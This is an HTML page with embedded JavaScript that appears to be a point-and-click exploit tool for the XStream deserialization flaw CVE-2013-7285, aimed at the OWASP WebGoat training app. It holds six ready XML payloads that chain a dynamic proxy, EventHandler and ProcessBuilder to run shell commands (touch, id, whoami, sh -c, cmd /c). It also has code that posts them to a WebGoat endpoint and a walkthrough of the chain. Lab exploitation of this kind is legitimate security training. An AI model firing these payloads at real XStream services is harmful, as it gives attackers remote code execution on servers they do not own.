<!DOCTYPE html>
<html>
<head>
    <title>CVE-2013-7285 XStream Exploit</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 1200px;
            margin: 50px auto;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            padding: 20px;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }
        h1 {
            color: #f5576c;
            border-bottom: 3px solid #f093fb;
            padding-bottom: 10px;
        }
        h2 {
            color: #f5576c;
            margin-top: 30px;
        }
        .info {
            background: #e3f2fd;
            padding: 15px;
            border-left: 4px solid #2196F3;
            margin: 20px 0;
            border-radius: 5px;
        }
        .success {
            background: #e8f5e9;
            border-left-color: #4CAF50;
        }
        .warning {
            background: #fff3e0;
            border-left-color: #ff9800;
        }
        .danger {
            background: #ffebee;
            border-left-color: #f44336;
        }
        button {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 5px;
            transition: transform 0.2s;
        }
        button:hover {
            transform: scale(1.05);
        }
        button:active {
            transform: scale(0.95);
        }
        .code {
            background: #263238;
            color: #aed581;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 10px 0;
            font-size: 13px;
        }
        textarea {
            width: calc(100% - 24px);
            height: 300px;
            padding: 10px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin: 10px 0;
        }
        textarea:focus {
            outline: none;
            border-color: #f5576c;
        }
        #output {
            background: #f5f5f5;
            padding: 15px;
            border-radius: 5px;
            min-height: 100px;
            margin-top: 20px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 12px;
        }
        .payload-btn {
            display: block;
            margin: 5px 0;
            text-align: left;
            width: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .exploit-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 20px 0;
        }
        @media (max-width: 768px) {
            .exploit-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üí£ CVE-2013-7285 - XStream Deserialization RCE</h1>
        
        <div class="info danger">
            <strong>‚ö†Ô∏è WARNING:</strong> This is a Remote Code Execution vulnerability!<br>
            You can execute arbitrary commands on the WebGoat server.<br>
            Use responsibly and only in authorized testing environments.
        </div>

        <div class="info">
            <strong>Vulnerability:</strong> XStream deserialization allows arbitrary code execution<br>
            <strong>Affected:</strong> XStream &lt; 1.4.7<br>
            <strong>Impact:</strong> Remote Code Execution (RCE)<br>
            <strong>Technique:</strong> Dynamic Proxy + EventHandler + ProcessBuilder
        </div>

        <h2>Step 1: Test Normal Contact</h2>
        <button onclick="testNormal()">‚úÖ Send Normal Contact</button>
        
        <h2>Step 2: Select Exploit Payload</h2>
        
        <div class="exploit-grid">
            <button class="payload-btn" onclick="loadPayload(1)">
                üíæ Payload 1: Touch File (Linux)
            </button>
            <button class="payload-btn" onclick="loadPayload(2)">
                üíæ Payload 2: Execute 'id' Command
            </button>
            <button class="payload-btn" onclick="loadPayload(3)">
                üíæ Payload 3: Contact with Exploit
            </button>
            <button class="payload-btn" onclick="loadPayload(4)">
                üíæ Payload 4: Simplified Proxy
            </button>
            <button class="payload-btn" onclick="loadPayload(5)">
                üíæ Payload 5: Windows CMD
            </button>
            <button class="payload-btn" onclick="loadPayload(6)">
                üíæ Payload 6: Echo to File
            </button>
        </div>

        <h2>Step 3: Customize & Send Payload</h2>
        <textarea id="payload" placeholder="Select a payload above or enter your own XML..."></textarea>
        <br>
        <button onclick="sendPayload()">üöÄ Send Exploit</button>
        <button onclick="clearOutput()">üßπ Clear Output</button>

        <h2>Output</h2>
        <div id="output">Ready to exploit...</div>

        <h2>How It Works</h2>
        <div class="info">
            <strong>Exploit Chain:</strong><br>
            1. XML deserialized by XStream.fromXML()<br>
            2. Creates a TreeSet with dynamic proxy<br>
            3. TreeSet compares elements using compareTo()<br>
            4. Dynamic proxy intercepts call via EventHandler<br>
            5. EventHandler redirects to ProcessBuilder.start()<br>
            6. Arbitrary command executed! üí•
        </div>

        <h2>Technical Details</h2>
        <div class="code">&lt;sorted-set&gt; ‚Üí TreeSet (needs to compare elements)
&lt;dynamic-proxy&gt; ‚Üí Creates proxy implementing Comparable
&lt;handler class="java.beans.EventHandler"&gt; ‚Üí Intercepts method calls
&lt;target class="java.lang.ProcessBuilder"&gt; ‚Üí Command executor
&lt;action&gt;start&lt;/action&gt; ‚Üí Method to invoke (start the process)</div>
    </div>

    <script>
        const output = document.getElementById('output');
        const payloadArea = document.getElementById('payload');

        const payloads = {
            1: `<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>touch</string>
          <string>/tmp/pwned</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>`,
            
            2: `<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>id</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>`,
            
            3: `<contact>
  <id>999</id>
  <firstName>
    <sorted-set>
      <string>foo</string>
      <dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
          <target class="java.lang.ProcessBuilder">
            <command>
              <string>whoami</string>
            </command>
          </target>
          <action>start</action>
        </handler>
      </dynamic-proxy>
    </sorted-set>
  </firstName>
  <lastName>Exploit</lastName>
  <email>exploit@test.com</email>
</contact>`,
            
            4: `<contact class="dynamic-proxy">
  <interface>org.owasp.webgoat.lessons.vulnerablecomponents.Contact</interface>
  <handler class="java.beans.EventHandler">
    <target class="java.lang.ProcessBuilder">
      <command>
        <string>touch</string>
        <string>/tmp/webgoat_pwned</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>`,
            
            5: `<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>cmd</string>
          <string>/c</string>
          <string>echo pwned > C:\\temp\\exploited.txt</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>`,
            
            6: `<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>sh</string>
          <string>-c</string>
          <string>echo "WebGoat Exploited!" > /tmp/exploit_proof.txt</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>`
        };

        function log(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            const prefix = type === 'error' ? '‚ùå' : type === 'success' ? '‚úÖ' : '‚ÑπÔ∏è';
            output.textContent += `[${timestamp}] ${prefix} ${message}\n`;
            output.scrollTop = output.scrollHeight;
        }

        function loadPayload(num) {
            payloadArea.value = payloads[num];
            log(`Loaded Payload ${num}`, 'success');
        }

        async function testNormal() {
            log('Sending normal contact...', 'info');
            
            const normalContact = `<contact>
    <id>1</id>
    <firstName>Bruce</firstName>
    <lastName>Mayhew</lastName>
    <email>webgoat@owasp.org</email>
</contact>`;

            try {
                const response = await fetch('http://192.168.254.112:8001/WebGoat/vulnerable-components/XStream', {
                    method: 'POST',
                    credentials: 'include',
                    headers: {'Content-Type': 'application/xml'},
                    body: normalContact
                });

                const result = await response.text();
                log('Normal contact response:', 'success');
                log(result, 'info');
            } catch (error) {
                log('Error: ' + error.message, 'error');
            }
        }

        async function sendPayload() {
            const payload = payloadArea.value.trim();
            
            if (!payload) {
                log('Please select or enter a payload!', 'error');
                return;
            }

            log('Sending exploit payload...', 'info');
            log('Payload:\n' + payload, 'info');

            try {
                const response = await fetch('http://192.168.254.112:8001/WebGoat/vulnerable-components/XStream', {
                    method: 'POST',
                    credentials: 'include',
                    headers: {'Content-Type': 'application/xml'},
                    body: payload
                });

                const result = await response.text();
                log('Response status: ' + response.status, response.ok ? 'success' : 'error');
                log('Response:', 'info');
                log(result, 'info');

                if (response.ok) {
                    log('üí• Exploit sent successfully!', 'success');
                    log('If command executed, check WebGoat Docker container', 'info');
                } else {
                    log('Server returned error. Try different payload.', 'error');
                }
            } catch (error) {
                log('Error: ' + error.message, 'error');
            }
        }

        function clearOutput() {
            output.textContent = 'Output cleared.\n';
            log('Ready for next exploit', 'success');
        }

        // Initialize
        log('XStream CVE-2013-7285 Exploit Tool loaded', 'success');
        log('1. Test normal contact first', 'info');
        log('2. Select an exploit payload', 'info');
        log('3. Send the exploit', 'info');
        log('Note: This only works on Docker version of WebGoat', 'info');
    </script>
</body>
</html>
